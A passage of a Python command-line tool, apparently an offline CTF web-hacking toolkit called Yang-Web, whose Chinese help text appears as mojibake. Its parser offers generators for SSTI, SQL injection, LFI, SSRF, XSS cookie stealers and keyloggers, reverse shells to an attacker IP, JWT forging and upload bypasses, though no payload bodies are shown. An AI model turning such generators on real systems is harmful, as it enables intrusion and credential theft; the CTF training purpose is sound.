        if cat not in cats_shown:
            cats_shown[cat] = []
        cats_shown[cat].append((key, meta))

    for cat in CATEGORIES:
        if cat not in cats_shown:
            continue
        print(f"\n  {bold(CATEGORIES[cat])} ({len(cats_shown[cat])} ä¸ª)")
        for key, meta in cats_shown[cat]:
            deps_str = f" {yellow('[é: ' + ','.join(meta['deps']) + ']')}" if meta["deps"] else ""
            print(f"    {dim('>')} {bold(meta['title'])}{deps_str}")
            print(f"      {dim(meta['description'])}")
            print(f"      {dim('è¿è¡:')} {cyan('yang-web scripts --run ' + repr(key))}")


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  Misc Crypto å­å½ä»¤
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

def cmd_misc(args):
    """Misc Crypto ç¥è¯åºå½ä»¤."""
    # --list: ååºææå¯ç ç±»å
    if args.category or (not args.search and not args.id and not args.encode and not args.decode):
        ciphers = list_ciphers(args.category)
        if args.category:
            print(bold(f"\nð åç±»: {args.category} ({len(ciphers)} ç§)"))
        else:
            cats = get_categories()
            print(bold(f"\nð Misc Crypto ç¥è¯åº â {len(ciphers)} ç§å¯ç ç±»å"))
            print(dim(f"  åç±»: {', '.join(cats)}"))
            print(dim(f"  ç¨æ³: yang-web misc --id <ç±»å>      æ¥çè¯¦æ"))
            print(dim(f"        yang-web misc --encode <ç±»å> -t ææ  ç¼ç "))
            print(dim(f"        yang-web misc --decode <ç±»å> -t å¯æ  è§£ç "))
            print(dim(f"        yang-web misc --search <å³é®è¯>    æç´¢\n"))

        for c in ciphers:
            tag = green("ð§") if c.get("encode") else blue("ð")
            img = dim(" [å¾]") if c.get("image") else ""
            print(f"  {tag} {bold(c['name']):12s} {dim('(')}{c['id']:20s}{dim(')')} {c['category']}{img}")

        if not args.category:
            print(dim(f"\n  å± {len(ciphers)} ç§ â ä½¿ç¨ --category <åç±»> ç­é"))
        return

    # --search: æç´¢
    if args.search:
        results = search_ciphers(args.search)
        if not results:
            print(yellow(f"æªæ¾å° '{args.search}' ç¸å³å¯ç ç±»å"))
            return
        print(bold(f"\nð æç´¢ '{args.search}' â {len(results)} æ¡ç»æ:\n"))
        for r in results:
            print(f"  {bold(r['name'])} ({r['id']}) â {r['description']}")
        return

    # --id: æ¥çè¯¦æ
    if args.id:
        info = get_cipher(args.id)
        if not info:
            print(red(f"æªç¥å¯ç ç±»å: {args.id}"))
            print(dim("ä½¿ç¨ yang-web misc æ¥çææå¯ç¨ç±»å"))
            return
        print(bold(f"\nð {info['name']} ({args.id})"))
        print(f"  åç±»: {info['category']}")
        print(f"  å«å: {', '.join(info.get('aliases', []))}")
        print(f"  æè¿°: {info['description']}")
        if info.get("features"):
            print(f"  ç¹å¾: {', '.join(info['features'])}")
        if info.get("encode"):
            print(f"  {green('â')} æ¯æç¼ç /è§£ç ")
        else:
            print(f"  {blue('â¹')} ä»æä¾åèå¾")
        img = get_image_path(args.id)
        if img:
            print(f"  ð¼ åèå¾: {img}")
        return

    # --encode: ç¼ç 
    if args.encode:
        if not args.text:
            print(red("è¯·æä¾ -t/--text åæ°"))
            return
        key = args.key or ""
        result = mc_encode(args.encode, args.text, key=key)
        print(bold(f"\nð {args.encode} ç¼ç :"))
        print(f"  {green(result)}")
        return

    # --decode: è§£ç 
    if args.decode:
        if not args.text:
            print(red("è¯·æä¾ -t/--text åæ°"))
            return
        key = args.key or ""
        result = mc_decode(args.decode, args.text, key=key)
        print(bold(f"\nð {args.decode} è§£ç :"))
        print(f"  {green(result)}")
        return


def cmd_solve(args):
    """ä¸é®æºè½è§£é¢å½ä»¤."""
    input_data = args.input
    input_type = args.type or "text"

    if args.file:
        input_type = "file"
        input_data = args.file
        if not os.path.isfile(input_data):
            print(red(f"æä»¶ä¸å­å¨: {input_data}"))
            return

    if not input_data:
        print(red("è¯·æä¾è¾å¥ææ¬ææä»¶è·¯å¾"))
        print(dim("  yang-web solve <ææ¬>"))
        print(dim("  yang-web solve --file <æä»¶è·¯å¾>"))
        return

    print(bold(f"\n[è§£é¢] ä¸é®æºè½è§£é¢"))
    print(f"  {dim('è¾å¥ç±»å:')} {cyan(input_type)}")
    print(f"  {dim('è¾å¥åå®¹:')} {input_data[:100]}{'...' if len(input_data) > 100 else ''}")
    print(f"\n  {dim('æ­£å¨å°è¯ç¸å³èæ¬...')}\n")

    results = auto_solve(input_data, input_type=input_type)

    if not results["results"]:
        print(yellow("  -- æ å¹éèæ¬"))
        return

    for i, entry in enumerate(results["results"], 1):
        status = green("v") if entry["success"] else red("x")
        print(f"  [{i}] {status} {entry['title']} ({entry['category']})")
        if entry["output"]:
            for line in entry["output"].strip().split("\n")[:10]:
                print(f"      {dim(line)}")
        print()

    print(bold(f"\n[ç»è®¡] {len(results['results'])} ä¸ªèæ¬, "
               f"{green(str(results['successes']))} æå, "
               f"{red(str(results['tried'] - results['successes']))} å¤±è´¥"))

    if results["successes"] == 0:
        print(yellow("\n  [æç¤º] å°è¯ --file æ¨¡å¼, ææå¨æå®èæ¬"))
        print(dim("     yang-web scripts --list  æ¥çææèæ¬"))


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  ä¸»å¥å£
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

def build_parser():
    """æå»ºå½ä»¤è¡è§£æå¨."""
    parser = argparse.ArgumentParser(
        prog="yang_web",
        description="Yang-Web â ç¦»çº¿ CTF Web çå£«åå",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ç¤ºä¾:
  yang_web decode "ZmxhZ3t0ZXN0fQ=="      æºè½é¾å¼è§£ç 
  yang_web decode --brute "dGVzdA=="      æ´åå°è¯ææè§£ç å¨
  yang_web encode base64 "hello"          ç¼ç 
  yang_web ssti --exploit --engine "Jinja2"  SSTI å©ç¨ Payload
  yang_web sqli --db MySQL                 SQL æ³¨å¥ Payload
  yang_web lfi --traversal                 è·¯å¾éå Payload
  yang_web hashid "5d41402abc4b2a76b9719d911017c592"
  yang_web jwt "eyJ..."                   JWT åæ
  yang_web php --magic                     PHP Magic Hash
  yang_web scan dir --search config        æç´¢ææç®å½
        """,
    )

    sub = parser.add_subparsers(dest="command", help="å­å½ä»¤")

    # ââ decode ââ
    p_decode = sub.add_parser("decode", help="æºè½è§£ç  (èªå¨æ£æµç¼ç  â é¾å¼è§£ç )")
    p_decode.add_argument("text", nargs="?", help="å¾è§£ç ææ¬ (æéè¿ç®¡é stdin)")
    p_decode.add_argument("--brute", action="store_true", help="æ´åå°è¯ææè§£ç å¨")
    p_decode.add_argument("--manual", metavar="ENCODING", help="æå®ç¼ç ç±»åæå¨è§£ç ")

    # ââ encode ââ
    p_encode = sub.add_parser("encode", help="ç¼ç ææ¬")
    p_encode.add_argument("type", nargs="?", help="ç¼ç ç±»å (å¦ base64/base32/hex/url)")
    p_encode.add_argument("text", nargs="?", help="å¾ç¼ç ææ¬ (æéè¿ç®¡é stdin)")
    p_encode.add_argument("--list", action="store_true", help="ååºå¯ç¨ç¼ç ç±»å")

    # ââ ssti ââ
    p_ssti = sub.add_parser("ssti", help="SSTI Payload çæ")
    p_ssti.add_argument("--detect", action="store_true", help="æ¾ç¤ºæ£æµ Payload")
    p_ssti.add_argument("--exploit", action="store_true", help="æ¾ç¤ºå©ç¨ Payload")
    p_ssti.add_argument("--engine", metavar="ENGINE", help="æå®æ¨¡æ¿å¼æ")
    p_ssti.add_argument("--bypass", action="store_true", help="æ¾ç¤ºç»è¿è¿æ»¤æå·§")
    p_ssti.add_argument("--search", metavar="KW", help="æç´¢ Payload")
    p_ssti.add_argument("--list", action="store_true", help="ååºæ¯æå¼æ")

    # ââ sqli ââ
    p_sqli = sub.add_parser("sqli", help="SQL æ³¨å¥ Payload")
    p_sqli.add_argument("--detect", action="store_true", help="æ¾ç¤ºæ£æµ Payload")
    p_sqli.add_argument("--db", metavar="DB", help="æå®æ°æ®åºç±»å")
    p_sqli.add_argument("--category", metavar="CAT", help="æ£æµç±»å«")
    p_sqli.add_argument("--blind", action="store_true", help="æ¾ç¤ºç²æ³¨æ¨¡æ¿")
    p_sqli.add_argument("--search", metavar="KW", help="æç´¢ Payload")
    p_sqli.add_argument("--list", action="store_true", help="ååºæ¯ææ°æ®åº")
    p_sqli.add_argument("--waf", type=str, nargs='?', const='all', metavar="CAT", help="SQL WAF ç»è¿æå·§")

    # ââ lfi ââ
    p_lfi = sub.add_parser("lfi", help="LFI / Path Traversal Payload")
    p_lfi.add_argument("--traversal", action="store_true", help="è·¯å¾éå Payload")
    p_lfi.add_argument("--files", action="store_true", help="æææä»¶åè¡¨")
    p_lfi.add_argument("--php", action="store_true", help="PHP ä¼ªåè®®")
    p_lfi.add_argument("--os", metavar="OS", help="æä½ç³»ç» (Linux/Windows)")
    p_lfi.add_argument("--windows", action="store_true", help="æ¾ç¤º Windows è·¯å¾éå")
    p_lfi.add_argument("--category", metavar="CAT", help="PHP ä¼ªåè®®ç±»å«")

    # ââ ssrf ââ
    p_ssrf = sub.add_parser("ssrf", help="SSRF Payload")
    p_ssrf.add_argument("--cloud", metavar="PROVIDER", nargs="?", const="all", help="äºåæ°æ®å°å")
    p_ssrf.add_argument("--bypass", dest="bypass_ssrf", action="store_true", help="SSRF ç»è¿æå·§")
    p_ssrf.add_argument("--ports", action="store_true", help="å¸¸è§åç½ç«¯å£")

    # ââ xss ââ
    p_xss = sub.add_parser("xss", help="XSS Payload")
    p_xss.add_argument("--detect", dest="detect_xss", action="store_true", help="æ£æµ Payload")
    p_xss.add_argument("--exfil", action="store_true", help="æ°æ®å¤ä¼  Payload")
    p_xss.add_argument("--steal", metavar="URL", help="çæ Cookie çªåå¨")
    p_xss.add_argument("--keylogger", metavar="URL", help="çæé®çè®°å½å¨")
    p_xss.add_argument("--bypass", dest="bypass_xss", action="store_true", help="WAF ç»è¿ Payload")
    p_xss.add_argument("--category", metavar="CAT", help="ç»è¿ç±»å«ç­é")

    # ââ rce ââ
    p_rce = sub.add_parser("rce", help="å½ä»¤æ³¨å¥ / RCE Payload")
    p_rce.add_argument("--shell", metavar="TYPE", help="åå¼¹ Shell ç±»å")
    p_rce.add_argument("--ip", metavar="IP", help="æ»å»è IP (--shell æ¶ä½¿ç¨)")
    p_rce.add_argument("--port", metavar="PORT", type=int, help="æ»å»èç«¯å£ (--shell æ¶ä½¿ç¨)")
    p_rce.add_argument("--list-shells", action="store_true", dest="list_shells", help="ååºåå¼¹ Shell ç±»å")
    p_rce.add_argument("--bypass", dest="bypass_rce", action="store_true", help="å½ä»¤æ³¨å¥ Bypass æå·§")

    # ââ php ââ
    p_php = sub.add_parser("php", help="PHP æå·§ Payload")
    p_php.add_argument("--magic", nargs="?", const="all", help="Magic Hash")
    p_php.add_argument("--type-juggle", action="store_true", dest="type_juggle", help="å¼±ç±»åæ¯è¾")
    p_php.add_argument("--deserialize", action="store_true", help="ååºååæå·§")
    p_php.add_argument("--waf-php", action="store_true", help="PHP RCE WAF ç»è¿æå·§")
    p_php.add_argument("--rce", dest="rce_php", action="store_true", help="RCE Bypass æå·§")

        # ââ upload ââ
    p_upload = sub.add_parser("upload", help="æä»¶ä¸ä¼  Payload")
    p_upload.add_argument("--ext", action="store_true", help="åç¼åç»è¿")
    p_upload.add_argument("--mime", action="store_true", help="Content-Type ä¼ªé ")
    p_upload.add_argument("--content", action="store_true", help="å¾çé©¬åå®¹ç»è¿")
    p_upload.add_argument("--parse", type=str, help="è§£ææ¼æ´ (nginx/apache/iis/all)")
    p_upload.add_argument("--htaccess", action="store_true", help=".htaccess Payload")
    p_upload.add_argument("--userini", action="store_true", help=".user.ini Payload")
    p_upload.add_argument("--advanced", action="store_true", help="é«çº§ç»è¿æå·§")
    p_upload.add_argument("--analyze", type=str, metavar="BLACKLIST", help="åæé¶åºé»åå (å¦: php,php3,phtml)")

# ââ hashid ââ
    p_hashid = sub.add_parser("hashid", help="Hash ç±»åè¯å«")
    p_hashid.add_argument("text", nargs="?", help="Hash å­ç¬¦ä¸² (æéè¿ç®¡é stdin)")

    # ââ jwt ââ
    p_jwt = sub.add_parser("jwt", help="JWT åæ / æ»å»")
    p_jwt.add_argument("token", nargs="?", help="JWT Token (æéè¿ç®¡é stdin)")
    p_jwt.add_argument("--none", action="store_true", help="None ç®æ³æ»å»")
    p_jwt.add_argument("--brute", action="store_true", help="å¼±å¯é¥çç ´")
    p_jwt.add_argument("--forge", action="store_true", help="ä¼ªé ç­¾å")
    p_jwt.add_argument("--secret", metavar="KEY", help="ç­¾åå¯é¥")
    p_jwt.add_argument("--wordlist", metavar="FILE", help="èªå®ä¹å­å¸è·¯å¾")

    # ââ scripts ââ
    p_scripts = sub.add_parser("scripts", help="ååµ CTF èæ¬åº")
    p_scripts.add_argument("--category", metavar="CAT", help="æåç±»ç­é (crypto/web/reverse/misc)")
    p_scripts.add_argument("--search", metavar="KW", help="æç´¢èæ¬")
    p_scripts.add_argument("--run", metavar="NAME", dest="run", help="Run script")
    p_scripts.add_argument("--args", metavar="ARGS", help="Args for script")
    p_scripts.add_argument("--check-deps", action="store_true", dest="check_deps",
                            help="Check dependency status")
    p_scripts.add_argument("--install-deps", metavar="NAME", nargs="?", const="all",
                            dest="install_deps",
                            help="Install deps (default: all, or script name)")

    # ââ solve ââ
    p_solve = sub.add_parser("solve", help="ä¸é®æºè½è§£é¢")
    p_solve.add_argument("input", nargs="?", help="è¾å¥ææ¬ (ç¼ç ä¸²/å¯æç­)")
    p_solve.add_argument("--type", metavar="TYPE", choices=["text", "file", "apk"],
                          help="è¾å¥ç±»å (é»è®¤: text)")
    p_solve.add_argument("--file", metavar="PATH", help="æä»¶è·¯å¾æ¨¡å¼")

    # ââ misc ââ
    p_misc = sub.add_parser("misc", help="Misc Crypto ç¥è¯åº (20+ å¯ç ç±»å)")
    p_misc.add_argument("--category", metavar="CAT", help="æåç±»ç­é")
    p_misc.add_argument("--search", metavar="KW", help="æç´¢å¯ç ç±»å")
    p_misc.add_argument("--id", metavar="ID", help="æ¥çæå®å¯ç è¯¦æ")
    p_misc.add_argument("--encode", metavar="ID", help="ç¼ç å¯ç ç±»å")
    p_misc.add_argument("--decode", metavar="ID", help="è§£ç å¯ç ç±»å")
    p_misc.add_argument("-t", "--text", metavar="TEXT", help="è¾å¥ææ¬")
    p_misc.add_argument("-k", "--key", metavar="KEY", help="å¯é¥ (ç»´åå°¼äºç­éè¦)")

    # ââ scan ââ
    p_scan = sub.add_parser("scan", help="ç®å½æ«æ (ç¦»çº¿è¯åº)")
    p_scan.add_argument("type", nargs="?", choices=["dir", "file"], default="dir", help="è¯åºç±»å (dir/file)")
    p_scan.add_argument("--all", action="store_true", help="æ¾ç¤ºå¨é¨è¯æ¡")
    p_scan.add_argument("--search", metavar="KW", help="æç´¢è¯åº")

    return parser


def main():
    """ç¨åºå¥å£."""
    if sys.platform == "win32":
        try:
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    parser = build_parser()
    args = parser.parse_args()

    if not args.command:
        print(banner())
        parser.print_help()
        return

    # è·¯ç±å°å¯¹åºå½ä»¤
    commands = {
        "decode": cmd_decode,
        "encode": cmd_encode,
        "ssti": cmd_ssti,
        "sqli": cmd_sqli,
        "lfi": cmd_lfi,
        "ssrf": cmd_ssrf_cmd,
        "xss": cmd_xss_cmd,
        "rce": cmd_rce_cmd,
        "php": cmd_php_cmd,
        "upload": cmd_upload,
        "hashid": cmd_hashid,
        "jwt": cmd_jwt,
        "scan": cmd_scan,
        "scripts": cmd_scripts,
        "misc": cmd_misc,
        "solve": cmd_solve,
    }

    func = commands.get(args.command)
    if func:
        func(args)


if __name__ == "__main__":
    main()
